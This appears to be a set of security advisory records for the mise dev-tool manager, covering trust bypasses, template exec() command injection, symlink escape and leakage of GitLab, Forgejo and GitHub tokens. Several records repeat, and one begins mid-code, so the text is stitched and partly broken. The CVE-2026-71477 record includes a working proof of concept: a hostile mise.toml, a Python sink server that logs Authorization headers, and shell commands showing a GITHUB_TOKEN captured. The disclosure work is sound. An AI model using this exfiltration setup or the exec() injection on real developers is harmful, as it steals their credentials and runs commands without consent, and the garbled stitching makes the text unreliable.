CVE-2026-103929.description: mise manages dev tools like node, python, cmake, and terraform. Prior to 2026.7.14, in the default non-safe mode, mise loads .mise.toml [settings] from an untrusted local project before trust approval and strip_local_only_settings removes only fields marked global_only. The unix_default_file_shell_args, unix_default_inline_shell_args, windows_default_file_shell_args, and windows_default_inline_shell_args settings were not marked global_only, allowing a repository to replace the default interpreter arguments used by trusted tasks that have no explicit shell, postinstall directives, template exec operations, or hooks that fall back to the default shell. When mise appends the trusted command after the attacker-controlled interpreter arguments, the attacker-selected command can execute first with the developer account's privileges even though the local configuration was never trusted. The separate path-sanitization hardening note in the advisory is outside this vulnerability. This issue is fixed in version 2026.7.14.

CVE-2026-33646.description: mise manages dev tools like node, python, cmake, and terraform. Prior to 2026.3.10, mise processes .tool-versions files through the Tera template engine during parsing, with the exec() function registered, enabling arbitrary command execution. Unlike .mise.toml files, .tool-versions files are not subject to trust verification in non-paranoid mode. This means an attacker can place a malicious .tool-versions file in a git repository, and when a victim with mise activated cds into the directory, arbitrary commands execute without any trust prompt. This vulnerability is fixed in 2026.3.10.

CVE-2026-54557.description: mise manages dev tools like node, python, cmake, and terraform. Prior to 2026.6.1, the mise HTTP backend builds its install symlink destination from the raw resolved version string for non-latest versions. Normal tool install paths use the sanitized version pathname, but the HTTP backend's symlink path uses the raw value. On Unix-like systems, if that version is an absolute path, PathBuf::join discards the intended mise installs root. A repository-controlled .tool-versions file can therefore make mise install create a symlink outside the mise install tree. With bin_path, the same issue can place an executable symlink under an attacker-selected absolute prefix, such as a developer-tool prefix that is later added to PATH. This vulnerability is fixed in 2026.6.1.

CVE-2026-55441.description: mise manages dev tools like node, python, cmake, and terraform. Prior to 2026.6.4, mise's trust feature gates config files (mise.toml, .tool-versions) through trust_check, but task-include files are loaded on a path that never reaches it. When a directory has a task-include dir (mise-tasks/, .mise/tasks/, …) but no config file, mise falls back to the default includes and renders each task's tera fields — and that tera environment has exec() registered. A {{ exec(command='…') }} in any rendered field runs arbitrary commands the moment the tasks are merely listed. There's no config file to gate on, so no trust prompt ever appears. Read-only commands trigger it: mise tasks, mise task ls, mise run, mise tasks --usage (the query shell completion runs on Tab). The victim only has to cd into a cloned repo and list or tab-complete a task. This vulnerability is fixed in 2026.6.4.

Prior to 2026.7.1, release tar archives record mise/bin/mise with user and group ID 1001 and packaging/standalone/install.envsubst extracts and moves it without normalizing ownership, allowing a local user with those IDs to replace a root-installed executable, especially when MISE_INSTALL_PATH targets a shared location such as /usr/local/bin. GHSA-w8pw-h853-frw2.title: GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control
GHSA-w8pw-h853-frw2.description: # GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not — it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` — no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent — there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites — 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) — each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink — GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today — the only `gitlab:` entry is `glab` → `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere — `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A — mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B — compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours — I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat — GitHub `@ntdatt812` --- ## Addendum — the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why — the `#6318` defect where page 2 went out unauthenticated). The next-page URL comes from the `Link` header: ```rust // src/http.rs:1709 pub(crate) fn resolve_pagination_url(current: &str, next: &str) -> Result<String> { if next.starts_with('http://') || next.starts_with('https://') { return Ok(next.to_string()); // absolute Link is taken as-is } ``` So a response can point the next request at any host, including a downgrade to plain `http://`. What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` → **no token attached** | | `gitlab.rs:137` | no gate → token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header — or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response — a `Link` header today, something else later — reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.

GHSA-w8pw-h853-frw2.description: # GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not — it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` — no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent — there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites — 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) — each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink — GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today — the only `gitlab:` entry is `glab` → `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere — `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A — mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B — compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours — I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat — GitHub `@ntdatt812` --- ## Addendum — the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why — the `#6318` defect where page 2 went out unauthenticated). What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` → **no token attached** | | `gitlab.rs:137` | no gate → token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header — or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response — a `Link` header today, something else later — reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.

CVE-2026-103929.title: mise manages dev tools like node, python, cmake, and terraform. P ...

CVE-2026-54557.description: mise manages dev tools like node, python, cmake, and terraform. Prior to 2026.6.1, the mise HTTP backend builds its install symlink destination from the raw resolved version string for non-latest versions. Normal tool install paths use the sanitized version pathname, but the HTTP backend's symlink path uses the raw value. On Unix-like systems, if that version is an absolute path, PathBuf::join discards the intended mise installs root. A repository-controlled .tool-versions file can therefore make mise install create a symlink outside the mise install tree. With bin_path, the same issue can place an executable symlink under an attacker-selected absolute prefix, such as a developer-tool prefix that is later added to PATH. This vulnerability is fixed in 2026.6.1.

CVE-2026-55441.title: mise manages dev tools like node, python, cmake, and terraform. P ...
CVE-2026-55441.description: mise manages dev tools like node, python, cmake, and terraform. Prior to 2026.6.4, mise's trust feature gates config files (mise.toml, .tool-versions) through trust_check, but task-include files are loaded on a path that never reaches it. When a directory has a task-include dir (mise-tasks/, .mise/tasks/, …) but no config file, mise falls back to the default includes and renders each task's tera fields — and that tera environment has exec() registered. The victim only has to cd into a cloned repo and list or tab-complete a task. This vulnerability is fixed in 2026.6.4.

CVE-2026-71477.description: mise manages dev tools like node, python, cmake, and terraform. }; host == 'api.github.com' || is_ghe_com_api_host(host) || (host != 'github.com' && !host.ends_with('.githubusercontent.com') && !host.ends_with('.ghe.com') && is_ghes_api_path(url.path())) } ``` and the token resolver, for a host that is not github.com, skip only the enterprise var then fall back to the plain GITHUB_TOKEN for any host, `crates/mise-util/src/github.rs:1208`: ```rust if !is_ghcom && let Some(token) = env::scoped_var('MISE_GITHUB_ENTERPRISE_TOKEN') { return Some((token, TokenSource::EnvVar('MISE_GITHUB_ENTERPRISE_TOKEN'))); } for var_name in GITHUB_TOKEN_ENV_VARS { if let Some(token) = env::scoped_var(var_name) { return Some((token, TokenSource::EnvVar(var_name))); } } ``` `GITHUB_TOKEN_ENV_VARS` is `['MISE_GITHUB_TOKEN', 'GITHUB_API_TOKEN', 'GITHUB_TOKEN']`, nothing tie them to the github host, and `get_headers` put that token in the Bearer for my url. last thing, the config don't ask trust. a `mise.toml` with plain string `[tools]` values is classified safe, and the check look only the values, never the key, `src/config/config_file/mise_toml.rs:3010`: ```rust table.iter().all(|(key, value)| match key.as_str() { 'min_version' | 'tasks' => true, 'tools' => value.as_table().is_some_and(|tools| { tools.values().all(|version| match version { toml::Value::String(_) => true, toml::Value::Array(versions) => { versions.iter().all(|v| matches!(v, toml::Value::String(_))) } _ => false, }) }), _ => false, }) ``` so `'github:owner/repo[api_url=...]' = 'latest'` is a string value, the file pass safe, and the api_url in the key is parsed after by BackendArg and reach the backend. there no prompt anywhere. ## PoC mise v2026.9.17 (sha256 63049bc35fb9065e8dc35ac8b25fdae53e9bd6f1885a843aedeba398e046a1ee), the files above are identical on current main. the hostile project, `proj/mise.toml`: ```toml [tools] 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' = 'latest' ``` a tiny server that stand for my host and just log what it get, `sink.py`: ```python import http.server, sys class H(http.server.BaseHTTPRequestHandler): def do_GET(self): sys.stderr.write('%s Authorization: %s\n' % (self.path, self.headers.get('Authorization'))) body = b'{'tag_name':'v0.0.1','draft':false,'prerelease':false,'assets':[]}' if self.path.endswith('/releases/latest') else b'[]' self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body) def log_message(self, *a): pass http.server.HTTPServer(('127.0.0.1', 8080), H).serve_forever() ``` i put a github token in the env : ```bash /tmp/mise-lab ❯ python3 sink.py 2>sink.log & /tmp/mise-lab ❯ cd proj /tmp/mise-lab/proj ❯ export GITHUB_TOKEN=ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /tmp/mise-lab/proj ❯ mise install /tmp/mise-lab/proj ❯ MISE_SAFE=1 mise install /tmp/mise-lab/proj ❯ mise ls-remote 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' ``` what my server got, per command: ```text mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U MISE_SAFE=1 mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U mise ls-remote /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U ``` also a https host work the same ## Impact a repo you clone can read your GITHUB_TOKEN and send it to a host it choose

GHSA-w8pw-h853-frw2.title: GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control
GHSA-w8pw-h853-frw2.description: # GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not — it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` — no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent — there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites — 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) — each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink — GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today — the only `gitlab:` entry is `glab` → `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere — `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A — mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B — compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours — I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat — GitHub `@ntdatt812` --- ## Addendum — the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why — the `#6318` defect where page 2 went out unauthenticated). The next-page URL comes from the `Link` header: ```rust // src/http.rs:1709 pub(crate) fn resolve_pagination_url(current: &str, next: &str) -> Result<String> { if next.starts_with('http://') || next.starts_with('https://') { return Ok(next.to_string()); // absolute Link is taken as-is } ``` So a response can point the next request at any host, including a downgrade to plain `http://`. What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` → **no token attached** | | `gitlab.rs:137` | no gate → token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header — or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response — a `Link` header today, something else later — reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.
